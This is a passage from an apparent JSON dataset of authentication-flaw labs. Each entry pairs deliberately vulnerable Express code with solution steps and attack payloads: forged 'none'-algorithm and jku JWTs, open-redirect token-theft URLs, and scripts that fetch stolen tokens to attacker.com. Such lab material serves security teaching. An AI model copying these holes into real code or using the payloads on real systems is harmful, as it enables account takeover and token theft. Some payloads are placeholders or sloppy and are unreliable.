        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst axios = require('axios');\nconst app = express();\napp.post('/verify', async (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, { complete: true });\n  let key;\n  if (decoded.header.jku) {\n    key = (await axios.get(decoded.header.jku)).data;\n  } else {\n    key = process.env.DEFAULT_KEY;\n  }\n  try {\n    jwt.verify(token, key);\n    res.json({ access: decoded.payload.role === 'admin' ? 'granted' : 'denied' });\n  } catch (e) {\n    res.status(403).json({ error: 'Invalid token' });\n  }\n});\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXItc2l0ZS5jb20va2V5LnB1YiJ9.eyJzdWIiOiIxMjM0Iiwicm9sZSI6ImFkbWluIn0.SIGNADURA",
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6OTk5OS9tYWxpY2lvdXMta2V5In0.eyJ1c2VyIjoiY2FybG9zIiwiYWRtaW4iOnRydWV9.U2lnbmVk",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXhwbG9pdC5leGFtcGxlL2tleS5qc29uIn0.eyJyb2xlIjoic3VwZXJhZG1pbiJ9.S1lNVEhFUkU"
        ]
    },
    {
        "Lab scenario": "OAuth token leakage through open redirect in mobile client",
        "Lab Description": "The mobile OAuth flow fails to validate redirect URIs properly when handling deep links. The application leaks access tokens to arbitrary domains via 302 redirects. To solve: chain an open redirect with the OAuth callback to intercept the token.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Identify mobile deep link handler (/mobile-auth) with OWASP ZAP",
            "Find open redirect vulnerability in /redirect endpoint",
            "Craft malicious URL chaining redirect with OAuth callback",
            "Lure victim to click link (simulated in lab)",
            "Capture access token from attacker-controlled server logs"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\nconst tokens = {};\napp.get('/mobile-auth', (req, res) => {\n  const { client_id, redirect_uri } = req.query;\n  const token = 'tok_' + Math.random().toString(36).substr(2);\n  tokens[token] = { client_id, user: 'mobile_user' };\n  res.redirect(`${redirect_uri}?token=${token}`);\n});\napp.get('/redirect', (req, res) => {\n  res.redirect(req.query.url);\n});\napp.get('/oauth-callback', (req, res) => {\n  if (tokens[req.query.token]) {\n    res.send('Authenticated');\n  } else {\n    res.status(400).send('Invalid token');\n  }\n});\napp.listen(3000);",
        "payloads": [
            "/mobile-auth?client_id=trusted_app&redirect_uri=/redirect?url=https://attacker.com",
            "/mobile-auth?client_id=mobile_client&redirect_uri=/redirect%3Furl%3Dhttp://evil.com/steal",
            "/mobile-auth?client_id=legit&redirect_uri=javascript:fetch('https://attacker.com/?token='+document.location.search)"
        ]
    },
    {
        "Lab scenario": "Session hijacking through WebSocket authentication bypass",
        "Lab Description": "The WebSocket upgrade request reuses HTTP session cookies without revalidation. The application maintains WebSocket connections after session expiration. To solve: hijack active WebSocket connection by replaying captured cookie during upgrade.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Capture WebSocket handshake with Burp Suite",
            "Note session cookie in Connection: Upgrade request",
            "Allow victim to authenticate and establish WebSocket",
            "Replay handshake with captured cookie during victim's active session",
            "Intercept and modify privileged WebSocket messages"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\nconst server = app.listen(3000);\nconst wss = new WebSocket.Server({ server });\nconst sessions = {};\nwss.on('connection', (ws, req) => {\n  const cookies = require('cookie').parse(req.headers.cookie || '');\n  if (sessions[cookies.session]) {\n    ws.user = sessions[cookies.session];\n    ws.send(`Welcome back ${ws.user}`);\n  } else {\n    ws.close(1008, 'Invalid session');\n  }\n});\napp.post('/login', (req, res) => {\n  sessions[Math.random().toString(36)] = req.body.user;\n  res.send('Logged in');\n});",
        "payloads": [
            "GET /chat HTTP/1.1\r\nHost: victim.com\r\nCookie: session=stolen_session_id\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n",
            "{\"user\":\"attacker\",\"session\":\"valid_session_id\"}",
            "ws://victim.com/ws?session=highjacked_session"
        ]
    },
    {
        "Lab scenario": "JWT claim injection via nested JSON parsing flaw",
        "Lab Description": "The JWT verification improperly handles nested JSON structures in claims. The application's deep object merging overwrites security controls. To solve: inject admin privileges through crafted nested claims in a valid JWT.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Capture valid JWT using Burp Suite and decode structure",
            "Identify claim merging behavior through fuzzing with Postman",
            "Craft nested JSON structure with conflicting admin claim",
            "Sign modified token using leaked debug endpoint credentials",
            "Submit to /admin-api endpoint and verify privilege escalation"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst deepmerge = require('deepmerge');\nconst app = express();\nconst DEFAULT_CLAIMS = { user: 'guest', roles: ['public'] };\napp.post('/verify', (req, res) => {\n  const token = req.body.token;\n  try {\n    const decoded = jwt.verify(token, process.env.SECRET);\n    const claims = deepmerge(DEFAULT_CLAIMS, decoded);\n    if (claims.roles.includes('admin')) {\n      res.send('Admin access granted');\n    } else {\n      res.status(403).send('Access denied');\n    }\n  } catch (e) {\n    res.status(401).send('Invalid token');\n  }\n});\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY2FybG9zIiwicm9sZXMiOlsidXNlciJdLCJfX3Byb3RvX18iOnsicm9sZXMiOlsicHVibGljIiwiYWRtaW4iXX19.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGFpbXMiOnsicm9sZXMiOlsidXNlciJdfSwiY2xhaW1zIjp7InJvbGVzIjpbImFkbWluIl19fQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlcyI6WyJwdWJsaWMiXSwiX2NvbnRleHQiOnsicm9sZXMiOlsiYWRtaW4iXX19.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        ]
    },
    {
        "Lab scenario": "OAuth token swapping through parameter pollution",
        "Lab Description": "The OAuth token exchange endpoint is vulnerable to HTTP parameter pollution. The application uses the first token parameter while logging the last. To solve: swap tokens during the exchange flow to gain elevated privileges.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept OAuth token exchange with Burp Suite",
            "Identify duplicate token parameters in POST body",
            "Craft request with attacker token first and victim token last",
            "Verify token mismatch in server logs via debug endpoint",
            "Use swapped token to access privileged resources"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\nconst tokens = {\n  'user_token': { scope: 'read' },\n  'admin_token': { scope: 'read write admin' }\n};\napp.post('/token', (req, res) => {\n  const token = Array.isArray(req.body.token) ? req.body.token[0] : req.body.token;\n  console.log('Token used:', req.body.token);\n  if (tokens[token]) {\n    res.json(tokens[token]);\n  } else {\n    res.status(400).send('Invalid token');\n  }\n});\napp.listen(3000);",
        "payloads": [
            "token=admin_token&token=user_token",
            "token[]=admin_token&token[]=user_token",
            "token=attacker_token&access_token=victim_token&token=admin_token"
        ]
    },
    {
        "Lab scenario": "Session fixation through GraphQL batch query caching",
        "Lab Description": "The GraphQL endpoint caches session tokens improperly when processing batch queries. The application reuses the first valid session for subsequent operations. To solve: fixate session through batch query and hijack victim's authenticated state.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Discover GraphQL batch endpoint using OWASP ZAP",
            "Capture valid session token from test account",
            "Craft batch query mixing session operations",
            "Verify session inheritance through debug logs",
            "Execute privileged mutations with hijacked session"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst app = express();\nconst schema = buildSchema(`\n  type Query {\n    getSession: String\n  }\n  type Mutation {\n    setSession(token: String): String\n    adminAction: String\n  }\n`);\nlet currentSession = null;\nconst root = {\n  getSession: () => currentSession,\n  setSession: ({token}) => {\n    currentSession = token;\n    return 'Session set';\n  },\n  adminAction: () => {\n    return currentSession === 'admin_token' ? 'Success' : 'Denied';\n  }\n};\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  batch: true\n}));\napp.listen(3000);",
        "payloads": [
            "[{\"query\":\"mutation {setSession(token: \\\"attacker_token\\\")}\"},{\"query\":\"mutation {setSession(token: \\\"victim_token\\\")}\"},{\"query\":\"mutation {adminAction}\"}]",
            "{\"query\":\"mutation {first: setSession(token: \\\"admin_token\\\") second: adminAction}\"}",
            "[{\"query\":\"mutation {setSession(token: \\\"fixed_session\\\")}\"},{\"query\":\"mutation {adminAction}\"}]"
        ]
    },
    {
        "Lab scenario": "JWT algorithm confusion via leaked debug endpoint",
        "Lab Description": "The application exposes a debug endpoint that leaks the public key used for JWT verification. The JWT implementation is vulnerable to algorithm confusion attacks. To solve: obtain the public key, craft an HS256-signed token with admin claims, and bypass authentication.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Discover /debug endpoint using OWASP ZAP directory brute-forcing",
            "Extract public key from debug response",
            "Modify JWT header to use HS256 algorithm",
            "Sign token with leaked public key as HMAC secret",
            "Submit forged token to /admin endpoint"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\nconst publicKey = fs.readFileSync('./public.key');\napp.get('/debug', (req, res) => {\n  res.json({ publicKey: publicKey.toString() });\n});\napp.post('/verify', (req, res) => {\n  const token = req.body.token;\n  try {\n    const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] });\n    res.json({ access: decoded.role === 'admin' ? 'granted' : 'denied' });\n  } catch (e) {\n    res.status(403).json({ error: 'Invalid token' });\n  }\n});\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.LteI-Z9G6QkY2wNIMr24Ld5q4f3xZQZ2x3h3k6W3ZkA",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicHJpdmlsZWdlIjoic3VwZXJ1c2VyIiwicm9sZSI6ImFkbWluIn0.4j5E5QhJ3qz7Q5Q7X5Q7X5Q7X5Q7X5Q7X5Q7X5Q7X5Q"
        ]
    },
    {
        "Lab scenario": "OAuth token leakage via misconfigured CORS in SPA",
        "Lab Description": "The OAuth implementation in the Single Page Application has overly permissive CORS headers. The application leaks access tokens to arbitrary origins through XHR requests. To solve: craft a malicious page that steals OAuth tokens via CORS and uses them to access protected resources.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Identify OAuth callback endpoint with Burp Suite",
            "Analyze CORS headers for permissive settings",
            "Create attacker page with XMLHttpRequest to OAuth endpoint",
            "Lure victim to visit malicious page (simulated in lab)",
            "Capture token from server response and use in Postman"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst cors = require('cors');\nconst app = express();\napp.use(cors({\n  origin: '*',\n  methods: ['GET', 'POST'],\n  allowedHeaders: ['Authorization']\n}));\nconst tokens = {};\napp.get('/oauth/callback', (req, res) => {\n  const token = 'tok_' + Math.random().toString(36).substr(2);\n  tokens[token] = { user: req.query.user || 'anonymous' };\n  res.json({ access_token: token });\n});\napp.get('/api/profile', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  if (tokens[token]) {\n    res.json({ email: 'admin@example.com', role: 'admin' });\n  } else {\n    res.status(401).json({ error: 'Invalid token' });\n  }\n});\napp.listen(3000);",
        "payloads": [
            "<script>fetch('http://victim.com/oauth/callback?user=admin').then(r=>r.json()).then(d=>fetch('http://attacker.com/steal?token='+d.access_token))</script>",
            "var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://victim.com/api/profile'); xhr.withCredentials = true; xhr.send();",
            "fetch('http://victim.com/oauth/callback', {method: 'POST', headers: {'Origin': 'http://evil.com'}, body: JSON.stringify({user: 'admin'})})"
        ]
    },
    {
        "Lab scenario": "Session fixation via WebSocket handshake parameter injection",
        "Lab Description": "The WebSocket upgrade process improperly handles session identifiers passed as URL parameters. The application accepts WebSocket session IDs through query strings without validation. To solve: fixate a session ID through crafted WebSocket URL and hijack victim's authenticated connection.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept WebSocket handshake with Burp Suite",
            "Identify session parameter in upgrade request",
            "Generate fixation token and craft WebSocket URL",
            "Trigger victim authentication (simulated in lab)",
            "Reuse fixated session via WebSocket client"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\nconst server = app.listen(3000);\nconst wss = new WebSocket.Server({ server });\nconst sessions = {};\nwss.on('connection', (ws, req) => {\n  const sessionId = new URL(req.url, 'http://dummy.com').searchParams.get('session') || req.headers['sec-websocket-protocol'];\n  if (sessions[sessionId]) {\n    ws.user = sessions[sessionId];\n    ws.send(`Welcome ${ws.user}`);\n  } else {\n    ws.close(1008, 'Invalid session');\n  }\n});\napp.get('/login', (req, res) => {\n  const sessionId = req.query.session || Math.random().toString(36).substr(2);\n  sessions[sessionId] = req.query.user || 'guest';\n  res.json({ sessionId });\n});\napp.get('/ws-url', (req, res) => {\n  res.send(`ws://localhost:3000/?session=${req.query.session}`);\n});",
        "payloads": [
            "ws://victim.com/?session=fixed_session_id",
            "new WebSocket('ws://victim.com/ws', ['session=injected_session']);",
            "Sec-WebSocket-Protocol: session=highjacked_session"
        ]
    },
    {
        "Lab scenario": "JWT tampering vulnerability in Authorization Header",
      
        "Lab Description": "The application uses JWT tokens for API authorization, but the server fails to validate token signatures properly. The token's algorithm is set to 'none', and the backend fails to enforce cryptographic verification. To solve: forge a valid JWT to access the admin resource and retrieve sensitive user data.",
      
        "Difficulty Level": "Hard",
      
        "Solution Steps": [
          "Use Postman to capture a valid JWT from the Authorization header after logging in with normal credentials.",
          "Verify the JWT token structure and decode its payload using jwt.io or Burp Suite Decoder.",
          "Modify the payload to {\"role\":\"admin\"} and change the header algorithm to 'none'.",
          "Craft the JWT manually or using a Python script without a signature and send the forged Authorization: Bearer <token> header in a GET /admin/users request.",
          "Check the server response for access to the admin dashboard and verify Carlos’s user data is present."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecure'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'admin123') { const token = jwt.sign({ username: 'admin', role: 'admin' }, secret); res.json({ token }); } else if (username === 'carlos') { const token = jwt.sign({ username: 'carlos', role: 'user' }, secret); res.json({ token }); } else { res.status(401).send('Unauthorized'); } }); app.get('/admin/users', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.role === 'admin') { res.send('Admin access granted. User: carlos, email: carlos@domain.com'); } else { res.status(403).send('Forbidden'); } } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(3000);",
      
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
          "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
          "JWT with header: {\"alg\":\"none\"}, payload: {\"role\":\"admin\"} and empty signature"
        ]
      },
      {
        "Lab scenario": "Session fixation vulnerability in login flow",
      
        "Lab Description": "The web app reuses pre-login session IDs after authentication, without regenerating them. An attacker can pre-set a known session ID and then trick a victim into logging in using that same ID. To solve: hijack Carlos's session by setting a fixed session ID before login and access his account page post-authentication.",
      
        "Difficulty Level": "Medium",
      
        "Solution Steps": [
          "Using Burp Suite, intercept a GET /login request and set a fixed session cookie (e.g., sessionid=attacker1234).",
          "Send the link with the preset cookie to the victim (Carlos).",
          "After Carlos logs in, reuse the same session ID (attacker1234) in your browser to gain access.",
          "Browse to /my-account with the hijacked session.",
          "Verify Carlos’s account page is loaded with valid data."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'secret123' }]; const sessions = {}; app.get('/login', (req, res) => { if (!req.cookies.sessionid) { res.cookie('sessionid', Math.random().toString(36).substring(2)); } res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sessionid] = username; res.redirect('/my-account'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user === 'carlos') { res.send('Carlos account data'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
      
        "payloads": [
          "Cookie: sessionid=attacker1234",
          "Trick victim to login with crafted sessionid via link",
          "Reuse sessionid=attacker1234 after victim login"
        ]
      },
      {
        "Lab scenario": "OAuth redirect_uri misconfiguration in OAuth callback endpoint",
      
        "Lab Description": "The OAuth implementation lacks strict validation of the redirect_uri parameter, allowing open redirect-based session hijacking. The application trusts any domain containing the correct base string. To solve: craft a malicious authorization URL that captures a valid OAuth token for Carlos’s session.",
      
        "Difficulty Level": "Easy",
      
        "Solution Steps": [
          "Use Burp Suite or Postman to initiate an OAuth login request to /oauth/authorize with a manipulated redirect_uri containing attacker-controlled domain (e.g., https://evil.com?redirect=https://vulnerable.app).",
          "Observe that the app redirects and appends the access_token as a query parameter to the redirect_uri.",
          "Simulate phishing: send this crafted link to the victim and get them to authorize it.",
          "Access the intercepted token and replay it in Authorization: Bearer <token> to access /my-account.",
          "Verify successful access to Carlos’s account."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const url = require('url'); const app = express(); const tokens = { 'carlos': 'token123' }; app.get('/oauth/authorize', (req, res) => { const { redirect_uri, user } = req.query; if (!user || !redirect_uri.includes('vulnerable.app')) { return res.status(400).send('Invalid request'); } const token = tokens[user]; res.redirect(`${redirect_uri}?access_token=${token}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token123') { res.send('Carlos account info'); } else { res.status(401).send('Invalid token'); } }); app.listen(5000);",
      
        "payloads": [
          "https://vulnerable.app/oauth/authorize?user=carlos&redirect_uri=https://evil.com?redirect=https://vulnerable.app",
          "Authorization: Bearer token123",
          "https://evil.com?access_token=token123"
        ]
      },
      {
        "Lab scenario": "JWT authentication bypass via 'none' algorithm in Authorization header",
        "Lab Description": "The backend uses JWTs for session management and relies on the 'alg' field of the JWT to determine verification logic. The server is misconfigured to accept unsigned tokens by trusting the 'none' algorithm. The application grants access to authenticated endpoints based solely on the decoded payload. To solve: craft a tampered token to access Carlos's account by bypassing signature verification.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept the JWT token issued after logging in as your own user.",
          "2. Decode the JWT using jwt.io or jwt_tool and observe the 'alg' header value is 'HS256'.",
          "3. Modify the 'alg' field to 'none' and change the payload's 'sub' or 'username' field to 'carlos'.",
          "4. Remove the signature segment and reconstruct the token as a two-part JWT.",
          "5. Send the modified token in the Authorization header and access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.use((req, res, next) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); req.user = decoded; next(); } catch (err) { return res.status(403).send('Invalid token'); } }); app.get('/my-account', (req, res) => { if (req.user.username === 'carlos') res.send('Welcome to Carlos’s account!'); else res.send('Not authorized'); }); app.listen(4000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
          "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImNhcmxvcyJ9."
        ]
      },
      {
        "Lab scenario": "Session fixation in cookie-based authentication on login route",
        "Lab Description": "This application uses a fixed `sessionID` value that is issued prior to authentication and is not regenerated upon login. The session ID is accepted from the client and trusted server-side, leading to session fixation. To solve: pre-fixate a session ID and trick the server into accepting it as Carlos’s session after login.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use OWASP ZAP to analyze login flow and observe session cookie issued on visiting /login.",
          "2. Save the initial session ID value and confirm it's preserved after login.",
          "3. Use a second browser/session to initiate login as Carlos with the previously fixated session ID.",
          "4. Log in using Carlos’s credentials in the manipulated session to bind it.",
          "5. Return to the first browser with the fixated session ID and access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'secretpass' }; app.get('/login', (req, res) => { const sid = req.cookies.sessionID || Math.random().toString(36).substr(2); res.cookie('sessionID', sid); res.send('<form method=post>Username:<input name=username> Password:<input name=password><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.sessionID] = username; res.send('Logged in'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionID]; if (user === 'carlos') res.send('Access granted to Carlos’s account'); else res.send('Unauthorized'); }); app.listen(4000);",
        "payloads": [
          "sessionID=abc123; login as carlos",
          "sessionID=fixed_session_token; reuse after login",
          "sessionID=carlos_prebind; match after post-login"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration in redirect_uri trust chain",
        "Lab Description": "This application integrates a third-party OAuth provider. However, it fails to validate the redirect_uri parameter correctly, allowing an attacker to supply an arbitrary value. This allows leaking the access token to an attacker-controlled domain. To solve: exploit the misconfigured OAuth flow and extract the access_token for Carlos’s account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Postman to explore the OAuth flow by initiating login through the app's /oauth/login endpoint.",
          "2. Intercept the OAuth redirect using Burp and identify the redirect_uri parameter.",
          "3. Modify the redirect_uri to an attacker-controlled domain like https://evil.com/callback and resend the request.",
          "4. Log in as Carlos on the OAuth provider and observe the token redirect to your controlled endpoint.",
          "5. Capture the access token and replay it against /my-account using Bearer authentication."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/oauth/login', (req, res) => { const redirect = req.query.redirect_uri; const authURL = `https://oauth.example.com/authorize?client_id=app123&redirect_uri=${redirect}&response_type=token`; res.redirect(authURL); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'VALID_TOKEN_FOR_CARLOS') res.send('Carlos account access granted'); else res.status(401).send('Invalid token'); }); app.listen(4000);",
        "payloads": [
          "redirect_uri=https://evil.com/callback",
          "redirect_uri=https://attacker.site/capture?token=",
          "Authorization: Bearer VALID_TOKEN_FOR_CARLOS"
        ]
      },
      {
        "Lab scenario": "JWT tampering via algorithm confusion in Authorization header",
        "Lab Description": "This lab's API uses JWTs for authentication, but fails to enforce algorithm verification properly. The application accepts the 'alg' field in the token header without validating it against a whitelist. An attacker can modify the token's algorithm to 'none' and forge authentication tokens. The application uses these tokens for REST API access to protected resources. To solve: forge a valid admin token using algorithm tampering to access the /admin endpoint.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Postman to capture a valid Authorization: Bearer <JWT> header after login.",
          "2. Decode the JWT using jwt.io or a local script and observe the 'alg' field and payload structure.",
          "3. Modify the JWT header to {\"alg\":\"none\"} and change the payload to {\"username\":\"admin\",\"role\":\"admin\"}.",
          "4. Remove the signature part of the JWT and reassemble the token with only header.payload.",
          "5. Send a GET request to /admin with the modified JWT in the Authorization header.",
          "6. Observe admin panel access to verify successful tampering."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', role: 'admin' }, { username: 'user1', role: 'user' }]; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, 'secret'); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') return res.send('Admin access granted'); } res.status(403).send('Unauthorized'); }); app.listen(4000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
          "{\"alg\":\"none\"}.{\"username\":\"admin\",\"role\":\"admin\"}."
        ]
      },
      {
        "Lab scenario": "OAuth implicit flow hijack via open redirect in redirect_uri",
        "Lab Description": "This lab simulates a web application using OAuth 2.0 for authentication through a third-party provider. The application improperly validates redirect URIs, allowing arbitrary open redirect manipulation. An attacker can poison the redirect_uri parameter to capture a victim's access token. To solve: craft a malicious OAuth URL to leak Carlos's token and use it to access the protected resource.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to intercept the OAuth login request and identify the redirect_uri parameter.",
          "2. Replace the redirect_uri with a URL you control (e.g., https://attacker.com/oauth/callback).",
          "3. Create a crafted URL like: https://auth-server.com/oauth/authorize?response_type=token&client_id=xyz&redirect_uri=https://attacker.com/oauth/callback.",
          "4. Use social engineering or script injection to trick Carlos into visiting the link.",
          "5. When Carlos authenticates, extract the token from the fragment of the redirected URL (in access_token=...).",
          "6. Replay the token in a request to /api/user-info using Postman to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const users = { 'carlos': { access_token: 'abc123xyz', name: 'Carlos' } }; app.get('/oauth/callback', (req, res) => { const token = req.query.token; if (!token) return res.status(400).send('Missing token'); res.send('Token received: ' + token); }); app.get('/api/user-info', (req, res) => { const token = req.headers['authorization']; if (!token) return res.status(401).send('No token'); const accessToken = token.replace('Bearer ', ''); if (accessToken === 'abc123xyz') return res.send('Welcome Carlos!'); res.status(403).send('Invalid token'); }); app.listen(4000);",
        "payloads": [
          "https://auth-server.com/oauth/authorize?response_type=token&client_id=xyz&redirect_uri=https://attacker.com/oauth/callback",
          "Bearer abc123xyz"
        ]
      },
      {
        "Lab scenario": "Session fixation vulnerability in login flow via preset session cookie",
        "Lab Description": "This lab's login process reuses the session ID that was initially assigned before authentication. The application fails to regenerate a session upon successful login, allowing session fixation. An attacker can pre-assign a session ID to a victim and hijack the session after login. To solve: fixate Carlos’s session ID, then reuse it to access his /dashboard page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to intercept a GET /login request and observe the Set-Cookie: session=<value> response.",
          "2. Store this session cookie and craft a phishing page that loads the application with this cookie preset (e.g., document.cookie='session=attacker-session'; location='/login').",
          "3. Trick Carlos into logging in while using the attacker-controlled session ID.",
          "4. Wait until the victim logs in; the server will bind the session to Carlos's account.",
          "5. Replay the same session cookie to access the /dashboard endpoint.",
          "6. Confirm successful hijack by accessing Carlos's dashboard."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; const users = { carlos: 'hunter2' }; app.get('/login', (req, res) => { if (!req.cookies.session) { const sid = Math.random().toString(36).slice(2); sessions[sid] = { username: null }; res.cookie('session', sid); } res.send('<form method=\"POST\">Login</form>'); }); app.post('/login', (req, res) => { const sid = req.cookies.session; const { username, password } = req.body; if (users[username] === password) { sessions[sid].username = username; res.send('Login successful'); } else { res.status(401).send('Invalid login'); } }); app.get('/dashboard', (req, res) => { const sid = req.cookies.session; if (sessions[sid] && sessions[sid].username === 'carlos') res.send('Welcome to Carlos's dashboard'); else res.status(403).send('Access denied'); }); app.listen(4000);",
        "payloads": [
          "document.cookie='session=fixedsession123';location='/login';",
          "Cookie: session=fixedsession123"
        ]
      },
      {
        "Lab scenario": "JWT signature bypass using 'none' algorithm in authentication middleware",
        "Lab Description": "The application uses JWTs for session management but does not validate the signature algorithm securely. The token is decoded without verifying the signature if the 'alg' field is set to 'none'. The application blindly trusts unsigned JWTs. To solve: Forge a valid admin session by tampering with the JWT payload.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
